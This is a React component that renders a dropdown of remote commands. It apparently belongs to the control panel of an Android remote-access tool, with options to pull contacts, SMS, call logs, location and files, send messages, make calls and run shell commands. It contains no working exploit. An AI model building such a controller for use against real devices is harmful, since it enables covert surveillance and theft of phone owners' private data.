import React, { useState, useCallback } from "react";
import { Select } from "@shopify/polaris";

const Action = ({ selected, setSelected }) => {
  const handleSelectChange = useCallback((value) => setSelected(value), []);

  const options = [
    { value: "Select Task", label: "Select Task" },
    { value: "getcontact", label: "Retrive Contact" },
    { value: "getsms", label: "Retrive SMS" },
    { value: "getservices", label: "Retrive Services" },
    { value: "getlocation", label: "Retrive Device Location" },
    { value: "getcalllogs", label: "Retrive Call Logs" },
    { value: "runshell", label: "Run Shell Command" },
    { value: "changewallpaper", label: "Change Wallpaper" },
    { value: "listfile", label: "Retrive File Location" },
    { value: "sendsms", label: "Send SMS" },
    { value: "makecall", label: "Make Call" },
    { value: "getapps", label: "Get Installed Apps" },
    { value: "getfile", label: "Retrive File" },
  ];

  return (
    <Select
      label="Select Action : "
      options={options}
      onChange={handleSelectChange}
      value={selected}
      labelInline={true}
    />
  );
};

export default Action;
